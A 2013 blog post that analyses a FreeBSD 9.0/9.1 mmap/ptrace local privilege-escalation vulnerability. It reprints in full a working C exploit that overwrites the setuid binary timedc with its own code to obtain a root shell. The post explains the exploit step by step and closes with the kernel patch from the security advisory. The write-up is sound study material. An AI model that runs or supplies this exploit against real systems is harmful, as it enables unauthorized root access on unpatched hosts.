<!DOCTYPE html>
<html lang="en">
<head>
        
        <title>FreeBSD mmap+ptrace Privilege Escalation Exploit Analysis</title>
        <meta charset="utf-8" />
                <link href="http://feed.hailang.me/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Raging Scholars Full Atom Feed" />
                                                <link href="http://feed.hailang.me/feeds/security.atom.xml" type="application/atom+xml" rel="alternate" title="Raging Scholars Categories Atom Feed" />
                                

        <!-- Mobile viewport optimized: j.mp/bplateviewport -->
        <meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1">

        <link rel="stylesheet" type="text/css" href="../../../../theme/gumby.css" />
        <link rel="stylesheet" type="text/css" href="../../../../theme/style.css" />
        <link rel="stylesheet" type="text/css" href="../../../../theme/pygment.css" />

        <script src="../../../../theme/js/libs/modernizr-2.6.2.min.js"></script>


                        <script>
                (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
                m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
                })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

                ga('create', 'UA-12039368-4', 'hailang.me');
                ga('send', 'pageview');

              </script>
          



        </head>

<body id="index" class="home">


    <div class="container">

        <div class="row">

          <header id="banner" class="body">
              <h1><a href="../../../..">Raging Scholars <strong>uprintf('There is no place like ::1\n');</strong></a></h1>
              <!---
              <h1><a href="../../../.."><strong>Raging Scholars</strong></a></h1>
              <h4><font color=grey>uprintf('There is no place like ::1\n');</font></h4>
              -->
          </header><!-- /#banner -->

            <div id="navigation" class="navbar row">
              <a href="#" gumby-trigger="#navigation &gt; ul" class="toggle"><i class="icon-menu"></i></a>
             
              <ul class="columns">
                <li><a href="../../../..">Home</a></li>

                        <!-- Display Categories -->
                                          <li><a href="../../../../category/code.html">Code!</a></li>
                              <li><a href="../../../../category/misc.html">Misc!</a></li>
                              <li class="active"><a href="../../../../category/security.html">Security!</a></li>
                                      <!-- Display Pages -->
                                          <li><a href="../../../../pages/about-me.html">About Me</a></li>
                          
              </ul>
            </div>

          <section id="content" class="body">

   <div class="row">
        <div class="eleven columns">


            <header>
              <h2 class="entry-title">
                <a href="../../../../posts/2013/Jun/freebsd-mmap-ptrace-exploit-analysis/" rel="bookmark"
                   title="Permalink to FreeBSD mmap+ptrace Privilege Escalation Exploit Analysis">FreeBSD mmap+ptrace Privilege Escalation Exploit Analysis</a></h2>
                      
            </header>
            <footer class="post-info">
              <abbr class="published" title="2013-06-20T00:00:00">
                Jun 20 2013
              </abbr>
                            <address class="vcard author">
                By <a class="url fn" href="../../../../author/hai-lang.html">Hai Lang</a>
              </address>
                          </footer><!-- /.post-info -->
            <div class="entry-content">
              <div class="section" id="the-exploit">
<h2>The Exploit</h2>
<blockquote class="epigraph">
Happy Birthday FreeBSD! Now you are 20 years old and your security is the same as 20 years ago... :)
-- Hunger &lt;<a class="reference external" href="mailto:hunger&#64;hunger.hu">hunger&#64;hunger.hu</a>&gt;</blockquote>
<p>Saw this little birthday gift this morning from <a class="reference external" href="http://seclists.org/fulldisclosure/2013/Jun/161">Full Disclosure</a>. Works on my FreeBSD VM. Here's a screenshot.</p>
<img alt="|filename|images/mmap_exploit.png" class="align-left" src="../../../../static/images/mmap_exploit.png" style="width: 608.0px; height: 178.0px;" />
<p>And here's the exploit code</p>
<div class="highlight"><pre><span class="cm">/*</span>
<span class="cm"> * FreeBSD 9.{0,1} mmap/ptrace exploit</span>
<span class="cm"> * by Hunger &lt;fbsd9lul@hunger.hu&gt;</span>
<span class="cm"> *</span>
<span class="cm"> * Happy Birthday FreeBSD!</span>
<span class="cm"> * Now you are 20 years old and your security is the same as 20 years ago...</span>
<span class="cm"> *</span>
<span class="cm"> * Greetings to #nohup, _2501, boldi, eax, johnny_b, kocka, op, pipacs, prof,</span>
<span class="cm"> *              sd, sghctoma, snq, spender, s2crew and others at #hekkcamp:</span>
<span class="cm"> *                      I hope we&#39;ll meet again at 8@1470n</span>
<span class="cm"> *</span>
<span class="cm"> * Special thanks to proactivesec.com</span>
<span class="cm"> *</span>
<span class="cm"> */</span>

<span class="cp">#include &lt;err.h&gt;</span>
<span class="cp">#include &lt;errno.h&gt;</span>
<span class="cp">#include &lt;unistd.h&gt;</span>
<span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;string.h&gt;</span>
<span class="cp">#include &lt;fcntl.h&gt;</span>
<span class="cp">#include &lt;sys/stat.h&gt;</span>
<span class="cp">#include &lt;sys/mman.h&gt;</span>
<span class="cp">#include &lt;sys/types.h&gt;</span>
<span class="cp">#include &lt;sys/ptrace.h&gt;</span>
<span class="cp">#include &lt;sys/wait.h&gt;</span>

<span class="cp">#define SH &quot;/bin/sh&quot;</span>
<span class="cp">#define TG &quot;/usr/sbin/timedc&quot;</span>

<span class="kt">int</span>
<span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">ac</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">av</span><span class="p">)</span> <span class="p">{</span>
   <span class="kt">int</span> <span class="n">from_fd</span><span class="p">,</span> <span class="n">to_fd</span><span class="p">,</span> <span class="n">status</span><span class="p">;</span>
   <span class="k">struct</span> <span class="n">stat</span> <span class="n">st</span><span class="p">;</span>
   <span class="k">struct</span> <span class="n">ptrace_io_desc</span> <span class="n">piod</span><span class="p">;</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="o">*</span><span class="n">d</span><span class="p">;</span>
   <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>  <span class="p">{</span>
        <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="n">execl</span><span class="p">(</span><span class="n">SH</span><span class="p">,</span> <span class="n">SH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
   <span class="p">}</span>

   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;FreeBSD 9.{0,1} mmap/ptrace exploit</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;by Hunger &lt;fbsd9lul@hunger.hu&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">((</span><span class="n">from_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">av</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span>
        <span class="p">(</span><span class="n">to_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">TG</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
                <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;open&quot;</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">av</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&quot;stat&quot;</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(((</span><span class="n">s</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span>
        <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">from_fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">off_t</span><span class="p">)</span><span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="o">||</span>
                <span class="p">(</span><span class="n">d</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span>
                        <span class="n">MAP_SHARED</span><span class="o">|</span><span class="n">MAP_NOSYNC</span><span class="p">,</span> <span class="n">to_fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">off_t</span><span class="p">)</span><span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
                                <span class="n">err</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">&quot;mmap&quot;</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">((</span><span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">())</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">&quot;fork&quot;</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PT_TRACE_ME</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
                <span class="n">err</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s">&quot;ptraceme&quot;</span><span class="p">);</span>

        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PT_ATTACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="s">&quot;ptattach&quot;</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">wait</span><span class="p">(</span><span class="o">&amp;</span><span class="n">status</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">&quot;wait&quot;</span><span class="p">);</span>

   <span class="n">piod</span><span class="p">.</span><span class="n">piod_op</span> <span class="o">=</span> <span class="n">PIOD_WRITE_D</span><span class="p">;</span>
   <span class="n">piod</span><span class="p">.</span><span class="n">piod_offs</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>
   <span class="n">piod</span><span class="p">.</span><span class="n">piod_addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
   <span class="n">piod</span><span class="p">.</span><span class="n">piod_len</span>  <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PT_IO</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="p">(</span><span class="kt">caddr_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">piod</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">&quot;ptio&quot;</span><span class="p">);</span>

   <span class="n">execl</span><span class="p">(</span><span class="n">TG</span><span class="p">,</span> <span class="n">TG</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>Seems this vulnerability is already announced on 18-June-2013 and a patch was released with the
<a class="reference external" href="http://www.freebsd.org/security/advisories/FreeBSD-SA-13:06.mmap.asc">Security Advisory</a></p>
<p>As stated in the <a class="reference external" href="http://www.freebsd.org/security/advisories/FreeBSD-SA-13:06.mmap.asc">Security Advisory</a>, mmap is a POSIX-compliant system call that allows users to
map files into memory by a process, and then can be access using memory operations.</p>
<p>And the ptrace is a handy tracing and debugging facility that allows users to attach to and control
the traced process.</p>
<p>A security vulnerability exists in the virtual memory system that the permission checks are insufficient
which allows the tracing process to modify adresses to which the traced process itself does not have
write access.</p>
</div>
<div class="section" id="the-analysis">
<h2>The Analysis</h2>
<p>The exploit code is quite simple, but it took me sometime to understand how <cite>mmap(2)</cite> and <cite>ptrace(2)</cite> works
under FreeBSD.</p>
<hr class="docutils" />
<p>See the code below</p>
<div class="highlight"><pre><span class="k">if</span> <span class="p">(</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>  <span class="p">{</span>
     <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
     <span class="n">execl</span><span class="p">(</span><span class="n">SH</span><span class="p">,</span> <span class="n">SH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>At the begining of the exploit, it checks if the effective user id is 0. This will only be true when
the suid bit is set for the executable. Of course it's not true at this point, because the exploit
binary doesn't have suid set.</p>
<p>However, this code will eventually get injected into another executable program, which obviously should
have the suid bit, so that we can then setuid to 0, and get our lovely shell with root privilege.</p>
<hr class="docutils" />
<div class="highlight"><pre><span class="cp">#define TG &quot;/usr/sbin/timedc&quot;</span>

<span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">timedc</span>
<span class="o">-</span><span class="n">r</span><span class="o">-</span><span class="n">sr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">1</span> <span class="n">root</span>  <span class="n">wheel</span>  <span class="mi">20688</span> <span class="n">Dec</span>  <span class="mi">4</span>  <span class="mi">2012</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">timedc</span>
</pre></div>
<p>As you can see here, <cite>timedc</cite> is chosen for us to inject to. Note that it has suid bit.</p>
<p>So now what's left is to just inject this code into <cite>timedc</cite>, and when it gets called, we get a shell.</p>
<hr class="docutils" />
<div class="highlight"><pre><span class="k">if</span> <span class="p">((</span><span class="n">from_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">av</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span>
     <span class="p">(</span><span class="n">to_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">TG</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
             <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;open&quot;</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">av</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
       <span class="n">err</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&quot;stat&quot;</span><span class="p">);</span>
</pre></div>
<p>Now it tries to open the compiled binary of itself (<cite>av[0]</cite>) as <cite>from_fd</cite>, and <cite>/usr/sbin/timedc</cite> as <cite>to_fd</cite>.
And then the stat of the exploit binary is saved in a stat struct called <cite>st</cite>. It'll later
be used to get the size of the exploit binary.</p>
<hr class="docutils" />
<div class="highlight"><pre><span class="k">if</span> <span class="p">(((</span><span class="n">s</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span>
     <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">from_fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">off_t</span><span class="p">)</span><span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="o">||</span>
             <span class="p">(</span><span class="n">d</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span>
                     <span class="n">MAP_SHARED</span><span class="o">|</span><span class="n">MAP_NOSYNC</span><span class="p">,</span> <span class="n">to_fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">off_t</span><span class="p">)</span><span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
                             <span class="n">err</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">&quot;mmap&quot;</span><span class="p">);</span>
</pre></div>
<p><cite>mmap</cite> is used then to map the exploit binary into memory as <cite>s</cite> and <cite>timedc</cite> as <cite>d</cite>.</p>
<p>Refer to <cite>mmap</cite> man pages for details.</p>
<hr class="docutils" />
<div class="highlight"><pre><span class="k">if</span> <span class="p">((</span><span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">())</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">err</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">&quot;fork&quot;</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PT_TRACE_ME</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
             <span class="n">err</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s">&quot;ptraceme&quot;</span><span class="p">);</span>

     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
     <span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PT_ATTACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">err</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="s">&quot;ptattach&quot;</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">wait</span><span class="p">(</span><span class="o">&amp;</span><span class="n">status</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">err</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">&quot;wait&quot;</span><span class="p">);</span>
</pre></div>
<p>Next it forks a child process. <cite>fork</cite> returns 0 to the child process, and the child process
id to the parent process.</p>
<p>Since <cite>!pid</cite> is true only for the child process,  <cite>PT_TRACE_ME</cite> marks the child as the traced process,
This is for the kernel to know that some other process is tracing this child.</p>
<p><cite>PT_ATTACH</cite> is executed by the parent process, it attaches to the child to start controlling it.
Now we have two processes of the exploit, one tracing process, and one traced process.</p>
<p>Finally with <cite>wait</cite>, it suspends the calling process until status is available for terminated child
process, or a signal is received from kernel. Since <cite>PT_TRACE_ME</cite> is set for the child process,
a signal from kernel is expected. That'll explicitly tell us that we are now okay to start tracing.</p>
<hr class="docutils" />
<div class="highlight"><pre><span class="n">piod</span><span class="p">.</span><span class="n">piod_op</span> <span class="o">=</span> <span class="n">PIOD_WRITE_D</span><span class="p">;</span>
<span class="n">piod</span><span class="p">.</span><span class="n">piod_offs</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>
<span class="n">piod</span><span class="p">.</span><span class="n">piod_addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
<span class="n">piod</span><span class="p">.</span><span class="n">piod_len</span>  <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PT_IO</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="p">(</span><span class="kt">caddr_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">piod</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">err</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">&quot;ptio&quot;</span><span class="p">);</span>
</pre></div>
<p><cite>piod</cite> is a <cite>ptrace_io_desc</cite> struct, it'll be used by <cite>PT_IO</cite></p>
<p>The <cite>PT_IO</cite> request allows reading and writing arbitrary amounts of data in the traced process's
address space. In this case the addr argument should be a pointer to a <cite>ptrace_io_desc</cite> which is
defined as</p>
<div class="highlight"><pre><span class="k">struct</span> <span class="n">ptrace_io_desc</span> <span class="p">{</span>
        <span class="kt">int</span>     <span class="n">piod_op</span><span class="p">;</span>        <span class="cm">/* I/O operation */</span>
        <span class="kt">void</span>    <span class="o">*</span><span class="n">piod_offs</span><span class="p">;</span>     <span class="cm">/* child offset */</span>
        <span class="kt">void</span>    <span class="o">*</span><span class="n">piod_addr</span><span class="p">;</span>     <span class="cm">/* parent offset */</span>
        <span class="kt">size_t</span>  <span class="n">piod_len</span><span class="p">;</span>       <span class="cm">/* request length */</span>
<span class="p">};</span>
</pre></div>
<p>This is designed for us to write data to the child process, but instead this piece of code writes
the exploit binary to <cite>timedc</cite>.</p>
<p>This is the exact point of the vulnerability, the parent tracing process controls the child traced
process to write data to <cite>timedc</cite>, which it originally has no privilege to do so.
The virtual memory system does not check if such write/read operation is allowed.
The injection of the exploit code into <cite>timedc</cite> is finished.</p>
<hr class="docutils" />
<div class="highlight"><pre><span class="n">execl</span><span class="p">(</span><span class="n">TG</span><span class="p">,</span> <span class="n">TG</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</pre></div>
<p>Now it runs <cite>timedc</cite>. Since it has the exploit code injected, and it has suid set,
we can now get a shell with root privilege.</p>
</div>
<div class="section" id="the-solution">
<h2>The Solution</h2>
<p>A patch is provided by the <a class="reference external" href="http://www.freebsd.org/security/advisories/FreeBSD-SA-13:06.mmap.asc">Security Advisory</a>. You can follow the instruction there to patch
your system.</p>
<div class="highlight"><pre><span class="o">---</span> <span class="n">sys</span><span class="o">/</span><span class="n">vm</span><span class="o">/</span><span class="n">vm_map</span><span class="p">.</span><span class="n">c</span>     <span class="p">(</span><span class="n">revision</span> <span class="mi">251636</span><span class="p">)</span>
<span class="o">+++</span> <span class="n">sys</span><span class="o">/</span><span class="n">vm</span><span class="o">/</span><span class="n">vm_map</span><span class="p">.</span><span class="n">c</span>     <span class="p">(</span><span class="n">working</span> <span class="n">copy</span><span class="p">)</span>
<span class="err">@@</span> <span class="o">-</span><span class="mi">3761</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">3761</span><span class="p">,</span><span class="mi">12</span> <span class="err">@@</span> <span class="n">RetryLookup</span><span class="o">:</span><span class="p">;</span>
                <span class="n">vm_map_unlock_read</span><span class="p">(</span><span class="n">map</span><span class="p">);</span>
                <span class="k">return</span> <span class="p">(</span><span class="n">KERN_PROTECTION_FAILURE</span><span class="p">);</span>
        <span class="p">}</span>
<span class="o">+</span>       <span class="k">if</span> <span class="p">((</span><span class="n">fault_typea</span> <span class="o">&amp;</span> <span class="n">VM_PROT_COPY</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
<span class="o">+</span>           <span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">max_protection</span> <span class="o">&amp;</span> <span class="n">VM_PROT_WRITE</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
<span class="o">+</span>           <span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">eflags</span> <span class="o">&amp;</span> <span class="n">MAP_ENTRY_COW</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="o">+</span>               <span class="n">vm_map_unlock_read</span><span class="p">(</span><span class="n">map</span><span class="p">);</span>
<span class="o">+</span>               <span class="k">return</span> <span class="p">(</span><span class="n">KERN_PROTECTION_FAILURE</span><span class="p">);</span>
<span class="o">+</span>       <span class="p">}</span>
</pre></div>
<p>The patch adds security checking upon virtual memory copying.</p>
<p>Nice birthday gift Hunger, had some very fun reading and debugging.</p>
<p><em>&lt;&lt; EOF</em></p>
</div>

            </div><!-- /.entry-content -->
                        <div class="comments">
              <h3>Comments</h3>
              <div id="disqus_thread"></div>
              <script type="text/javascript">
                var disqus_identifier = "posts/2013/Jun/freebsd-mmap-ptrace-exploit-analysis/";
                (function() {
                var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
                dsq.src = 'http://ragingscholars.disqus.com/embed.js';
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
                })();
              </script>
            </div>
            

        </div><!-- /.eleven.columns -->
        
     <div class="three columns">

<h4>Pages</h4>

 <ul>
              <li><a href="../../../../pages/about-me.html">About Me</a></li>
        </ul>

<h4>Categories</h4>
<ul>
			<li><a href="../../../../category/code.html">Code!</a></li>
			<li><a href="../../../../category/misc.html">Misc!</a></li>
			<li><a href="../../../../category/security.html">Security!</a></li>
	</ul>


<h4>Tags</h4>
	<ul>
		    <li class="tag-4"><a href="../../../../tag/rootkit.html">rootkit</a></li>
		    <li class="tag-2"><a href="../../../../tag/freebsd.html">freebsd</a></li>
		    <li class="tag-4"><a href="../../../../tag/rst.html">rst</a></li>
		    <li class="tag-4"><a href="../../../../tag/pelican.html">pelican</a></li>
		    <li class="tag-4"><a href="../../../../tag/.html"></a></li>
		    <li class="tag-1"><a href="../../../../tag/algorithm.html">algorithm</a></li>
		    <li class="tag-1"><a href="../../../../tag/project-euler.html">project euler</a></li>
		    <li class="tag-2"><a href="../../../../tag/security.html">security</a></li>
		    <li class="tag-4"><a href="../../../../tag/misc.html">misc</a></li>
		    <li class="tag-1"><a href="../../../../tag/math.html">math</a></li>
		    <li class="tag-1"><a href="../../../../tag/python.html">python</a></li>
	</ul>



</div> </div><!-- /.row -->


</section>

       </div><!-- /.row -->
    </div><!-- /.container -->


       <div class="container.nopad bg">

    
        <footer id="credits" class="row">
          <div class="seven columns left-center">

                   <address id="about" class="vcard body">
                    Proudly powered by <a href="http://getpelican.com/">Pelican</a>
                    <br />
                    All contents on this website are under 
                    <a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.en_US">
                        Creative Commons Attribution-NonCommercial-ShareAlike 3.0 Unported License</a>
                    </address>
          </div>


          <div class="seven columns">
            <div class="row">
              <ul class="socbtns">

                                <li><div class="btn info"><a href="http://www.weibo.com/bestwc" target="_blank">新浪微博</a></div></li>
                
                                <li><div class="btn danger"><a href="https://plus.google.com/100640905756801185675/posts/p/pub" target="_blank">Google+</a></div></li>
                
                                <li><div class="btn facebook"><a href="http://www.facebook.com/bestwc" target="_blank">Facebook</a></div></li>
                
                                <li><div class="btn twitter"><a href="https://twitter.com/lang_hai" target="_blank">Twitter</a></div></li>
                
                                <li><div class="btn primary"><a href="https://github.com/langhai" target="_blank">Github</a></div></li>
                
              </ul>
            </div>
          </div>
        </footer>

    </div>


<script type="text/javascript">
    var disqus_shortname = 'ragingscholars';
    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = 'http://' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>
  <script src="../../../../theme/js/libs/jquery-1.9.1.min.js"></script>
  <script src="../../../../theme/js/libs/gumby.min.js"></script>
  <script src="../../../../theme/js/plugins.js"></script>

</body>
</html>